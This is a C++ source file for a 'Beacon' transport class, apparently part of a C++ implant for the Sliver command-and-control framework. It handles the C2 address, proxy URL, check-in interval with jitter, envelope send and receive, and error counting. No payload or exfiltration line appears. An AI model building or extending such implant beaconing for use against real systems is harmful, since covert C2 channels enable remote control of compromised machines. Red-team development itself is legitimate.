#include "Beacon.h"


namespace transports {
	Beacon::Beacon(const string& _activeC2, unique_ptr<IClient>& cli,const string& _proxyURL,int interval,int jitter,int reconnectInterval) : activeC2(_activeC2),proxyURL(_proxyURL) {
		this->interval = std::chrono::seconds(interval);
		this->jitter = std::chrono::seconds(jitter);
		this->reconnectInterval = std::chrono::seconds(reconnectInterval);
		this->client = std::move(cli);
		//this->pivotEnvelope_queue = make_shared<concurrency::concurrent_queue<sliverpb::Envelope>>();
	}
	void Beacon::BeaconStart() {
		return;
	}
	bool Beacon::BeaconInit() {
		try {
			return this->client->SessionInit();
		}
		catch (std::exception& e) {
#ifdef DEBUG
			cout << e.what() << endl;
#endif
			std::unique_lock lk{ this->m };
			this->connectionErrors += 1;
		}
		return false;
	}

	bool Beacon::BeaconSend(sliverpb::Envelope& envelope) {
		try
		{
			return this->client->WriteEnvelopeNoResp(envelope);
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
			std::unique_lock lk{ this->m };
			this->connectionErrors += 1;
		}
		return false;
	}

	unique_ptr<sliverpb::Envelope> Beacon::BeaconRecv() {
		try
		{
			return this->client->ReadEnvelope();
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
			std::unique_lock lk{ this->m };
			this->connectionErrors += 1;
		}
		return nullptr;
	}
	bool Beacon::BeaconRecv(const sliverpb::Envelope& to_send, sliverpb::Envelope& resp) {
		try
		{
			return this->client->WriteAndReceive(to_send, resp);
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
			std::unique_lock lk{ this->m };
			this->connectionErrors += 1;
			return false;
		}
	}
	
	std::chrono::seconds Beacon::Duration() {
		unique_lock lk{ m };
		auto n = rand() % this->jitter.count() + this->interval.count();
		return std::chrono::seconds(n);
	}
	std::chrono::seconds Beacon::GetInterval() {
		unique_lock lk{ m };
		return this->interval;
	}
	std::chrono::seconds Beacon::GetJitter() {
		unique_lock lk{ m };
		return this->jitter;
	}
	std::chrono::seconds Beacon::GetReconnectInterval() {
		unique_lock lk{ m };
		return this->reconnectInterval;
	}
	int Beacon::GetConnectionErrors() {
		unique_lock lk{ m };
		return this->connectionErrors;
	}
	void Beacon::SetConnectionErrors(int val) {
		unique_lock lk{ m };
		this->connectionErrors = val;
	}
	bool Beacon::Reconfigure(int64_t interval, int64_t jitter, int64_t reconnectInterval) {
		unique_lock lk{ m };
		if(interval != 0)
			this->interval = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::nanoseconds(interval));
		if(jitter != 0)
			this->jitter = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::nanoseconds(jitter));
		if(reconnectInterval != 0)
			this->reconnectInterval = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::nanoseconds(reconnectInterval));
		return true;
	}
}